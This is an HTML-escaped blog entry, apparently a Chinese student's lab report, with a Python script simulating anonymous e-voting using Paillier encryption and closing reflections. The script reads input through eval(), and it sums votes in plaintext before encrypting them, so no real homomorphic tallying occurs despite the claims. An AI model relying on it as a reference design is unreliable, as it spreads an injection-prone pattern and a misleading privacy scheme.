&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Paillier&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;***************************此程序模拟了基于Paillier算法的匿名电子投票的流程:*****************************************&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;首先每位投票者为候选人投票并将结果加密发送给计票人。每人只有1张选票，选票上被投票的候选者得到1张选票，其他候选者得到0张选票;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;然后计票人将所有选票上对应候选人的加密的投票结果相乘，并将加密的统计结果发送给公布人;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;最后公布人对统计的票数进行解密并公布;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;***************************************************************************************************************************&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;houxuan_num=&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;请设置候选人数：&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;toupiao_num=&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;请设置投票人数：&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;houxuanpiao=[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt; (houxuan_num+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,toupiao_num+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;----------请第&amp;#123;&amp;#125;名投票者为候选者投票----------&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,houxuan_num+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        houxuanpiao[j]+=&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;请为第&amp;#123;&amp;#125;名候选者投票:&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(j)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;对该投票结果进行加密并发送给计票人&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;-------计票人计票完成并将加密后的投票结果发给公布人-------&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;加密后的投票结果为：&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;N, g, lambda_1, miu = Paillier.keygen(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;encrypted_m=[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt; (houxuan_num+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;decrypt_c=[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt; (houxuan_num+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,houxuan_num+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    encrypted_m[i]=Paillier.encrypt(houxuanpiao[i],N,g)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;第&amp;#123;&amp;#125;位候选人获得的选票票数的加密结果为：&amp;#123;&amp;#125;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(i,encrypted_m[i]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    time.sleep(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;-------公布人解密计票结果并公布最终的投票结果-------&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,houxuan_num+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    decrypt_c[i]=Paillier.decrypt(encrypted_m[i],lambda_1,N,miu)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;第&amp;#123;&amp;#125;位候选人获得了&amp;#123;&amp;#125;张选票&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(i,decrypt_c[i]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    time.sleep(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;max_index=decrypt_c.index(&lt;span class=&#34;built_in&#34;&gt;max&lt;/span&gt;(decrypt_c))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;最终第&amp;#123;&amp;#125;位候选人获得的选票最多，为&amp;#123;&amp;#125;张&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(max_index,decrypt_c[max_index]))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我将 p 和 q 的长度设置为 1024 比特，然后根据题目要求编写代码，引用了 time 库使得程序运行更流程，引用 Paillier 里的三个函数完成密钥生成、加密和解密的过程。&lt;/p&gt;
&lt;p&gt;​	最终将两个代码进行测试，&lt;strong&gt;代码完美完成预计任务&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;结论与体会&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#结论与体会&#34;&gt;#&lt;/a&gt; 结论与体会&lt;/h2&gt;
&lt;p&gt;​	在本次实验中，通过编写和测试 Paillier 算法及其在匿名电子投票系统中的应用，我深刻理解了同态加密算法的原理和实际应用价值。通过实践，我掌握了 Paillier 算法的核心机制，包括密钥生成、加密、解密过程以及如何利用算法的加法同态性质。&lt;/p&gt;
&lt;p&gt;​	首先，在密钥生成阶段，我学习到了选择合适的大素数 p 和 q，以及如何计算 N 和 λ，这些都是保证加密算法安全性的基础。选择随机数 g 的过程也让我认识到了在加密算法中引入随机性的重要性，这有助于提高算法的安全性。在编写加密和解密函数时，我通过实践深入理解了 Paillier 算法的数学原理，以及如何将理论应用到实际编程中。&lt;/p&gt;
&lt;p&gt;​	通过将 Paillier 算法应用于模拟的匿名电子投票系统中，我体会到了同态加密算法在保护隐私信息方面的巨大潜力。在这个系统中，选民的投票选择得到了加密保护，同时还能够在不解密的情况下进行票数统计，这充分展示了 Paillier 算法加法同态性质的强大用途。&lt;/p&gt;
&lt;p&gt;​	此外，我还学习到了算法的安全性分析，包括大素数分解问题和离散对数问题，这些都是算法安全性的理论基础。通过对这些数论难题的了解，我认识到了为什么 Paillier 算法被认为是安全的，并且可以在实际应用中提供强有力的数据保护。&lt;/p&gt;
&lt;p&gt;​	总的来说，这次实验不仅让我对同态加密算法有了深入的了解，而且还让我体会到了将理论知识应用到实践中的重要性。我意识到，理论和实践相结合是理解和掌握复杂概念的关键。通过这次实验，我对加密算法的原理、实现以及在现实世界中的应用有了更加全面的认识，这将对我的未来学习和研究产生积极影响。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
    </channel>
</rss>
